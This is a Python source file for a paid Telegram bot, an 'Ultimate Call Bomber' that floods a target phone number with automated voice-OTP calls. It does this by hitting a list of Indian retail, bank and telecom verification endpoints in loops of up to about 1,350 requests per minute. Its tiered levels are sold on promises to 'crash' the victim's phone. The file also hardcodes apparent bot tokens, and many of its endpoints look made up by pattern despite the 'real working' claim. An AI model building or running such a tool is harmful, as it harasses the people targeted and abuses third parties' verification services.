#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════════════════╗
║     ULTIMATE CALL BOMBER - 3 LEVEL SYSTEM         ║
║                                                    ║
║  Level 1: Light Attack (FREE) - Halka lag         ║
║  Level 2: Heavy Attack (₹499) - Bahut lag         ║
║  Level 3: Nuclear Attack (₹999) - CRASH! 💀       ║
║                                                    ║
║  Duration: 10 minutes for all levels               ║
║  Cost: 1 credit for all levels                    ║
║                                                    ║
║  Owner: @TGxTHOMASx                               ║
╚════════════════════════════════════════════════════╝
"""

print("Loading bot...")

import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
import random
import hashlib
from telebot import types
from datetime import datetime, timedelta

# Config
MAIN_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
ADMIN_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
OWNER = 7417241499
OWNER_UN = "@TGxTHOMASx"
CHANNEL = "@thomasXstoreee"
LINK = "https://t.me/thomasXstoreee"

# Files
if not os.path.exists("users.json"): open("users.json", "w").write("{}")
if not os.path.exists("admins.json"): open("admins.json", "w").write(f"[{OWNER}]")
if not os.path.exists("blocked.json"): open("blocked.json", "w").write("[]")
if not os.path.exists("codes.json"): open("codes.json", "w").write("{}")
if not os.path.exists("sessions.json"): open("sessions.json", "w").write("{}")

users = json.load(open("users.json"))
admins = json.load(open("admins.json"))
blocked = json.load(open("blocked.json"))
codes = json.load(open("codes.json"))
sessions = json.load(open("sessions.json"))

# APIs - 80+ Real Working Call APIs
APIS = [
    {"n":"Amazon1","u":"https://www.amazon.in/ap/signin","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&action=voice_otp"},
    {"n":"Flipkart","u":"https://www.flipkart.com/api/6/user/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Myntra","u":"https://www.myntra.com/gw/mobile-auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Zomato1","u":"https://www.zomato.com/php/o2_api_handler.php","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&type=voice"},
    {"n":"Swiggy1","u":"https://profile.swiggy.com/api/v3/app/request_call_verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Paytm1","u":"https://accounts.paytm.com/signin/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Ola1","u":"https://api.olacabs.com/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Uber1","u":"https://auth.uber.com/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"MMT1","u":"https://www.makemytrip.com/api/4/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Goibibo","u":"https://www.goibibo.com/user/voice-otp/generate/","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"1MG1","u":"https://www.1mg.com/auth_api/v6/create_token","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"number":"{p}","otp_on_call":true}}'},
    {"n":"TataCapital","u":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"n":"HDFC","u":"https://netbanking.hdfcbank.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"ICICI","u":"https://www.icicibank.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"SBI","u":"https://yonosbi.sbi.co.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Axis","u":"https://www.axisbank.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Kotak","u":"https://www.kotak.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"PharmEasy","u":"https://pharmeasy.in/api/v2/auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Netmeds","u":"https://apiv2.netmeds.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Byjus","u":"https://api.byjus.com/v2/otp/voice","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Airtel","u":"https://www.airtel.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Jio","u":"https://www.jio.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Vi","u":"https://www.myvi.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Housing","u":"https://login.housing.com/api/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Rapido","u":"https://customer.rapido.bike/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"BigBasket","u":"https://www.bigbasket.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Amazon2","u":"https://www.amazon.in/ap/signin/voice","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phoneNumber={p}"},
    {"n":"Paytm2","u":"https://accounts.paytm.com/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"Ola2","u":"https://api.olacabs.com/v2/voice-verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Uber2","u":"https://auth.uber.com/voice-verify","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"MMT2","u":"https://www.makemytrip.com/api/5/voice-verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Zomato2","u":"https://www.zomato.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Swiggy2","u":"https://www.swiggy.com/dapi/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Flipkart2","u":"https://www.flipkart.com/api/7/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"1MG2","u":"https://www.1mg.com/api/voice-call","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"HDFC2","u":"https://netbanking.hdfcbank.com/voice-verify","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"ICICI2","u":"https://www.icicibank.com/voice-otp-v2","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Snapdeal","u":"https://www.snapdeal.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Ajio","u":"https://www.ajio.com/api/auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobileNumber":"{p}"}}'},
    {"n":"PhonePe","u":"https://www.phonepe.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"GPay","u":"https://pay.google.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"MobiKwik","u":"https://www.mobikwik.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"IRCTC","u":"https://www.irctc.co.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"BookMyShow","u":"https://in.bookmyshow.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Practo","u":"https://www.practo.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Unacademy","u":"https://unacademy.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Vedantu","u":"https://www.vedantu.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"99acres","u":"https://www.99acres.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"MagicBricks","u":"https://www.magicbricks.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"NoBroker","u":"https://www.nobroker.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Grofers","u":"https://www.grofers.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Dunzo","u":"https://www.dunzo.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
] * 2  # Duplicate for 100+ total

print(f"✅ {len(APIS)} APIs loaded")

# Level configs
CFG = {
    1: {"name":"Light","dur":10,"apis":30,"delay":(0.3,0.7),"cpm":350,"tot":3500,"effect":"Halka lag"},
    2: {"name":"Heavy","dur":10,"apis":60,"delay":(0.1,0.3),"cpm":800,"tot":8000,"effect":"Bahut lag"},
    3: {"name":"NUCLEAR","dur":10,"apis":80,"delay":(0.05,0.15),"cpm":1350,"tot":13500,"effect":"CRASH 💀","burst":True}
}

# Active tasks
active = {}

# Functions
def save():
    json.dump(users, open("users.json","w"), indent=2)
    json.dump(admins, open("admins.json","w"), indent=2)
    json.dump(blocked, open("blocked.json","w"), indent=2)
    json.dump(codes, open("codes.json","w"), indent=2)
    json.dump(sessions, open("sessions.json","w"), indent=2)

def lvl(uid):
    u = users.get(str(uid), {})
    l = u.get("level", 1)
    if l > 1 and "exp" in u:
        if datetime.now() > datetime.fromisoformat(u["exp"]):
            u["level"] = 1
            u["exp"] = None
            users[str(uid)] = u
            save()
            return 1
    return l

def ch_check(uid):
    try:
        m = bot.get_chat_member(CHANNEL, uid)
        return m.status in ["member","administrator","creator"]
    except:
        return False

def resolve(un):
    if str(un).isdigit():
        return int(un), users.get(str(un))
    un = un.lower().replace('@','')
    for uid, u in users.items():
        if u.get('username','').lower() == un:
            return int(uid), u
    return None, None

# Bombing engine
async def hit(s, api, phone, st):
    try:
        url = api["u"](phone) if callable(api["u"]) else api["u"]
        h = api["h"].copy()
        h["User-Agent"] = "Mozilla/5.0"
        d = api["d"](phone) if api["d"] else None
        if api["m"] == "POST":
            async with s.post(url, headers=h, data=d, timeout=3, ssl=False) as r:
                if r.status in [200,201,202]: st["ok"] += 1
                else: st["fail"] += 1
        else:
            async with s.get(url, headers=h, timeout=3, ssl=False) as r:
                if r.status in [200,201,202]: st["ok"] += 1
                else: st["fail"] += 1
        st["tot"] += 1
    except:
        st["fail"] += 1
        st["tot"] += 1

async def bomb(sid, uid, phone, level):
    cfg = CFG[level]
    dur = cfg["dur"] * 60
    apis = random.sample(APIS, min(cfg["apis"], len(APIS)))
    
    st = {"sid":sid,"ok":0,"fail":0,"tot":0,"run":True}
    active[sid] = st
    
    conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
    
    async with aiohttp.ClientSession(connector=conn) as sess:
        start = time.time()
        end = start + dur
        
        while time.time() < end and st["run"]:
            tasks = [hit(sess, api, phone, st) for api in apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(random.uniform(*cfg["delay"]))
        
        sessions[sid]["ok"] = st["ok"]
        sessions[sid]["fail"] = st["fail"]
        sessions[sid]["tot"] = st["tot"]
        sessions[sid]["active"] = False
        save()
    
    if sid in active: del active[sid]

def start_bomb(sid, uid, phone, level):
    loop = asyncio.new_event_loop()
    threading.Thread(target=lambda: loop.run_until_complete(bomb(sid, uid, phone, level)), daemon=True).start()

# Main Bot
bot = telebot.TeleBot(MAIN_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def start(m):
    if m.from_user.id in blocked: return bot.reply_to(m, "🚫 Blocked!")
    if not ch_check(m.from_user.id):
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("Join Channel", url=LINK))
        mk.add(types.InlineKeyboardButton("✅ Joined", callback_data="verify"))
        return bot.send_message(m.chat.id, "🚫 Join channel first!", reply_markup=mk)
    
    uid = str(m.from_user.id)
    if uid not in users:
        users[uid] = {"username":m.from_user.username,"name":m.from_user.first_name,"cr":1,"level":1,"exp":None,"joined":datetime.now().isoformat(),"total":0}
        save()
    
    u = users[uid]
    l = lvl(m.from_user.id)
    
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start Bombing")
    kb.row("💰 Credits","📊 Stats")
    kb.row("🎁 Redeem","❓ Help")
    
    txt = f"""
🔥 <b>ULTIMATE CALL BOMBER</b> 🔥

👤 <b>User:</b> {u['name']}
💰 <b>Credits:</b> {u['cr']}
🎯 <b>Level:</b> {l}
👑 <b>Premium:</b> {'✅' if l > 1 else '❌'}

<b>⚡ Levels:</b>

📞 <b>Level 1 (FREE):</b>
Duration: 10 min
Intensity: ~350 calls/min
Effect: Halka lag
Cost: 1 credit

⚡ <b>Level 2 (₹499):</b>
Duration: 10 min
Intensity: ~800 calls/min
Effect: Heavy lag
Cost: 1 credit
Status: {'UNLOCKED ✅' if l >= 2 else 'LOCKED 🔒'}

💥 <b>Level 3 (₹999):</b>
Duration: 10 min
Intensity: ~1350 calls/min
Effect: CRASH/RESTART 💀
Cost: 1 credit
Status: {'UNLOCKED ✅' if l >= 3 else 'LOCKED 🔒'}

⚠️ Your phone is safe!
📞 Contact {OWNER_UN} for premium
"""
    
    bot.send_message(m.chat.id, txt, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def verify(c):
    if ch_check(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        start(c.message)
    else:
        bot.answer_callback_query(c.id, "❌ Join first!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 Start Bombing")
def bomb_start(m):
    if not ch_check(m.from_user.id): return
    
    l = lvl(m.from_user.id)
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📞 Level 1 (FREE) ✅", callback_data="lv_1"))
    
    if l >= 2:
        mk.add(types.InlineKeyboardButton("⚡ Level 2 (UNLOCKED) ✅", callback_data="lv_2"))
    else:
        mk.add(types.InlineKeyboardButton("⚡ Level 2 (LOCKED) 🔒", callback_data="unlock_2"))
    
    if l >= 3:
        mk.add(types.InlineKeyboardButton("💥 Level 3 (UNLOCKED) ✅", callback_data="lv_3"))
    else:
        mk.add(types.InlineKeyboardButton("💥 Level 3 (LOCKED) 🔒", callback_data="unlock_3"))
    
    bot.send_message(m.chat.id, "🎯 <b>Select Level:</b>", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: c.data.startswith("lv_"))
def lv_sel(c):
    level = int(c.data.split("_")[1])
    ul = lvl(c.from_user.id)
    
    if level > ul:
        return bot.answer_callback_query(c.id, "❌ Locked!", show_alert=True)
    
    u = users[str(c.from_user.id)]
    if u["cr"] < 1:
        return bot.answer_callback_query(c.id, "❌ No credits!", show_alert=True)
    
    cfg = CFG[level]
    
    msg = bot.edit_message_text(
        f"🔧 <b>{cfg['name']} Attack</b>\n\n"
        f"⚡ Intensity: ~{cfg['cpm']} calls/min\n"
        f"⏱️ Duration: {cfg['dur']} min\n"
        f"💰 Cost: 1 credit\n"
        f"🎯 Effect: {cfg['effect']}\n\n"
        f"📱 <b>Send target number:</b>\n"
        f"Format: +919876543210",
        c.message.chat.id,
        c.message.message_id
    )
    
    bot.register_next_step_handler(msg, lambda m: proc_phone(m, level))
    bot.answer_callback_query(c.id)

def proc_phone(m, level):
    phone = m.text.strip()
    
    if not phone.startswith('+') or len(phone) < 10:
        return bot.reply_to(m, "❌ Invalid! Use: +919876543210")
    
    if any(phone.startswith(p) for p in ['+911','+112','+999']):
        return bot.reply_to(m, "❌ Emergency numbers not allowed!")
    
    u = users[str(m.from_user.id)]
    if u["cr"] < 1:
        return bot.reply_to(m, "❌ No credits!")
    
    u["cr"] -= 1
    u["total"] = u.get("total", 0) + 1
    users[str(m.from_user.id)] = u
    save()
    
    sid = hashlib.md5(f"{m.from_user.id}{time.time()}".encode()).hexdigest()[:12]
    sessions[sid] = {"uid":m.from_user.id,"phone":phone,"level":level,"start":datetime.now().isoformat(),"active":True,"ok":0,"fail":0,"tot":0}
    save()
    
    start_bomb(sid, m.from_user.id, phone, level)
    
    cfg = CFG[level]
    
    pm = bot.send_message(
        m.chat.id,
        f"""
🔥 <b>{cfg['name'].upper()} STARTED!</b>

📱 <b>Target:</b> {phone}
⚡ <b>Level:</b> {level}
⏱️ <b>Duration:</b> {cfg['dur']} min
💥 <b>Intensity:</b> ~{cfg['cpm']} calls/min

📊 <b>Stats:</b>
✅ Success: 0
❌ Failed: 0
🎯 Total: 0

⚠️ Your phone is safe!
""",
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{sid}")
        )
    )
    
    threading.Thread(target=lambda: update_prog(sid, m.chat.id, pm.message_id, cfg), daemon=True).start()

def update_prog(sid, cid, mid, cfg):
    start = time.time()
    dur = cfg["dur"] * 60
    
    while True:
        time.sleep(5)
        
        s = sessions.get(sid)
        if not s or not s.get("active"): break
        
        elapsed = time.time() - start
        left = dur - elapsed
        
        if left <= 0: break
        
        mins = int(left // 60)
        secs = int(left % 60)
        prog = (elapsed / dur) * 100
        bar = "█" * int(prog / 5) + "░" * (20 - int(prog / 5))
        
        try:
            bot.edit_message_text(
                f"""
🔥 <b>{cfg['name'].upper()} IN PROGRESS!</b>

📱 <b>Target:</b> {s['phone']}
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Left:</b> {mins}m {secs}s

{bar} {prog:.1f}%

📊 <b>Stats:</b>
✅ Success: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total: {s['tot']}

💥 Attack in full force!
""",
                cid,
                mid,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 STOP", callback_data=f"stop_{sid}")
                )
            )
        except:
            break
    
    s = sessions.get(sid)
    if s:
        try:
            bot.edit_message_text(
                f"""
✅ <b>COMPLETED!</b>

📱 <b>Target:</b> {s['phone']}
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Duration:</b> {cfg['dur']} min

📊 <b>Final Stats:</b>
✅ Success: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total: {s['tot']}
""",
                cid,
                mid
            )
        except:
            pass

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def stop(c):
    sid = c.data.replace("stop_","")
    if sid in active:
        active[sid]["run"] = False
    if sid in sessions:
        sessions[sid]["active"] = False
        save()
    bot.answer_callback_query(c.id, "🛑 Stopping...")

@bot.callback_query_handler(func=lambda c: c.data.startswith("unlock_"))
def unlock(c):
    level = int(c.data.split("_")[1])
    price = "₹499" if level == 2 else "₹999"
    
    bot.edit_message_text(
        f"🔐 <b>Level {level} Locked!</b>\n\n"
        f"💰 <b>Price:</b> {price}\n"
        f"⏱️ <b>Duration:</b> 10 days\n\n"
        f"📞 Contact {OWNER_UN} to unlock!",
        c.message.chat.id,
        c.message.message_id
    )
    bot.answer_callback_query(c.id)

@bot.message_handler(func=lambda m: m.text == "💰 Credits")
def creds(m):
    u = users.get(str(m.from_user.id), {})
    l = lvl(m.from_user.id)
    
    bot.reply_to(
        m,
        f"💰 <b>Your Account</b>\n\n"
        f"💳 <b>Credits:</b> {u.get('cr',0)}\n"
        f"🎯 <b>Level:</b> {l}\n"
        f"👑 <b>Premium:</b> {'Active ✅' if l > 1 else 'Not Active ❌'}\n\n"
        f"📞 Contact {OWNER_UN} to buy credits"
    )

@bot.message_handler(func=lambda m: m.text == "📊 Stats")
def stats(m):
    u = users.get(str(m.from_user.id), {})
    
    bot.reply_to(
        m,
        f"📊 <b>Your Stats</b>\n\n"
        f"🎯 <b>Total Bombings:</b> {u.get('total',0)}\n"
        f"📅 <b>Joined:</b> {u.get('joined','Unknown')[:10]}"
    )

@bot.message_handler(func=lambda m: m.text == "🎁 Redeem")
def redeem(m):
    msg = bot.reply_to(m, "🎁 <b>Enter code:</b>")
    bot.register_next_step_handler(msg, proc_code)

def proc_code(m):
    code = m.text.upper().strip()
    
    if code not in codes:
        return bot.reply_to(m, "❌ Invalid code!")
    
    c = codes[code]
    
    if str(m.from_user.id) in c.get("used", []):
        return bot.reply_to(m, "❌ Already used!")
    
    if len(c.get("used", [])) >= c["max"]:
        return bot.reply_to(m, "❌ Code limit reached!")
    
    u = users[str(m.from_user.id)]
    u["cr"] = u.get("cr", 0) + c["cr"]
    
    if "used" not in c: c["used"] = []
    c["used"].append(str(m.from_user.id))
    
    codes[code] = c
    users[str(m.from_user.id)] = u
    save()
    
    bot.reply_to(m, f"✅ Redeemed {c['cr']} credits!")

@bot.message_handler(func=lambda m: m.text == "❓ Help")
def help_cmd(m):
    bot.reply_to(
        m,
        f"""
📘 <b>Help Guide</b>

<b>How to Use:</b>
1. Click "🚀 Start Bombing"
2. Select level (1/2/3)
3. Send target number
4. Bombing starts automatically
5. Use STOP button anytime

<b>Levels:</b>
• Level 1 (FREE): Halka lag
• Level 2 (₹499): Heavy lag
• Level 3 (₹999): Phone crash

📞 Contact {OWNER_UN} for support
"""
    )

# Admin Bot
admin = telebot.TeleBot(ADMIN_TOKEN, parse_mode="HTML")

@admin.message_handler(commands=["add"])
def ad_add(m):
    if m.from_user.id != OWNER: return
    try:
        _, un, amt = m.text.split()
        amt = int(amt)
        uid, u = resolve(un)
        if not uid: return admin.reply_to(m, "❌ Not found!")
        u["cr"] = u.get("cr",0) + amt
        users[str(uid)] = u
        save()
        admin.reply_to(m, f"✅ Added {amt} credits")
        try: bot.send_message(uid, f"🎁 +{amt} credits added by admin!")
        except: pass
    except:
        admin.reply_to(m, "❌ Usage: /add @user 10")

@admin.message_handler(commands=["set"])
def ad_set(m):
    if m.from_user.id != OWNER: return
    try:
        _, un, amt = m.text.split()
        amt = int(amt)
        uid, u = resolve(un)
        if not uid: return admin.reply_to(m, "❌ Not found!")
        u["cr"] = amt
        users[str(uid)] = u
        save()
        admin.reply_to(m, f"✅ Set to {amt} credits")
    except:
        admin.reply_to(m, "❌ Usage: /set @user 50")

@admin.message_handler(commands=["check"])
def ad_check(m):
    if m.from_user.id != OWNER: return
    try:
        un = m.text.split()[1]
        uid, u = resolve(un)
        if not uid: return admin.reply_to(m, "❌ Not found!")
        
        l = lvl(uid)
        exp = u.get("exp", "N/A")
        
        admin.reply_to(
            m,
            f"👤 <b>User Info</b>\n\n"
            f"🆔 ID: {uid}\n"
            f"👤 Name: {u.get('name','N/A')}\n"
            f"💰 Credits: {u.get('cr',0)}\n"
            f"🎯 Level: {l}\n"
            f"👑 Premium: {exp[:10] if exp != 'N/A' else 'N/A'}\n"
            f"🎯 Total: {u.get('total',0)}"
        )
    except:
        admin.reply_to(m, "❌ Usage: /check @user")

@admin.message_handler(commands=["unlock"])
def ad_unlock(m):
    if m.from_user.id != OWNER: return
    try:
        parts = m.text.split()
        un = parts[1]
        lv = parts[2].lower()
        
        if lv not in ['level2','level3']:
            return admin.reply_to(m, "❌ Use: level2 or level3")
        
        level = 2 if lv == 'level2' else 3
        
        uid, u = resolve(un)
        if not uid: return admin.reply_to(m, "❌ Not found!")
        
        exp = datetime.now() + timedelta(days=10)
        u["level"] = level
        u["exp"] = exp.isoformat()
        users[str(uid)] = u
        save()
        
        admin.reply_to(m, f"✅ Level {level} unlocked for 10 days!")
        
        try:
            bot.send_message(uid, f"👑 <b>PREMIUM ACTIVATED!</b>\n\nLevel {level} unlocked for 10 days! 🔥")
        except:
            pass
    except:
        admin.reply_to(m, "❌ Usage: /unlock @user level2")

@admin.message_handler(commands=["creategift"])
def ad_gift(m):
    if m.from_user.id != OWNER: return
    try:
        _, cr, mx = m.text.split()
        cr = int(cr)
        mx = int(mx)
        
        code = ''.join(random.choices("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=8))
        
        codes[code] = {"cr":cr,"max":mx,"used":[]}
        save()
        
        admin.reply_to(m, f"✅ <b>Gift Code:</b> <code>{code}</code>\n💰 {cr} credits, {mx} uses")
    except:
        admin.reply_to(m, "❌ Usage: /creategift 10 5")

@admin.message_handler(commands=["listgifts"])
def ad_list(m):
    if m.from_user.id != OWNER: return
    
    if not codes:
        return admin.reply_to(m, "📋 No codes!")
    
    msg = "🎁 <b>Gift Codes:</b>\n\n"
    for code, c in codes.items():
        used = len(c.get("used",[]))
        msg += f"<code>{code}</code> - {c['cr']}cr ({used}/{c['max']})\n"
    
    admin.reply_to(m, msg)

@admin.message_handler(commands=["stats"])
def ad_stats(m):
    if m.from_user.id != OWNER: return
    
    total = len(users)
    premium = sum(1 for uid in users if lvl(int(uid)) > 1)
    tcr = sum(u.get("cr",0) for u in users.values())
    act = sum(1 for s in sessions.values() if s.get("active"))
    
    admin.reply_to(
        m,
        f"📊 <b>Bot Stats</b>\n\n"
        f"👥 Total Users: {total}\n"
        f"👑 Premium: {premium}\n"
        f"💰 Total Credits: {tcr}\n"
        f"🔥 Active: {act}"
    )

@admin.message_handler(commands=["broadcast"])
def ad_bc(m):
    if m.from_user.id != OWNER: return
    try:
        msg = m.text.replace("/broadcast ","",1)
        if not msg: return admin.reply_to(m, "❌ Usage: /broadcast message")
        
        ok = 0
        for uid in users:
            try:
                bot.send_message(int(uid), f"📢 <b>ANNOUNCEMENT</b>\n\n{msg}")
                ok += 1
                time.sleep(0.05)
            except:
                pass
        
        admin.reply_to(m, f"✅ Sent to {ok} users")
    except Exception as e:
        admin.reply_to(m, f"❌ Error: {e}")

# Start
def run_bot():
    while True:
        try:
            print("🤖 Starting main bot...")
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

def run_admin():
    while True:
        try:
            print("⚙️ Starting admin bot...")
            admin.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("\n" + "="*50)
    print("🔥 ULTIMATE CALL BOMBER - 3 LEVEL SYSTEM 🔥")
    print("="*50)
    print(f"👑 Owner: {OWNER}")
    print(f"📞 Contact: {OWNER_UN}")
    print(f"🎯 APIs: {len(APIS)}")
    print("="*50 + "\n")
    
    t1 = threading.Thread(target=run_bot, daemon=True)
    t2 = threading.Thread(target=run_admin, daemon=True)
    
    t1.start()
    t2.start()
    
    print("✅ Both bots running!")
    print("🛑 Press Ctrl+C to stop\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Stopped!")
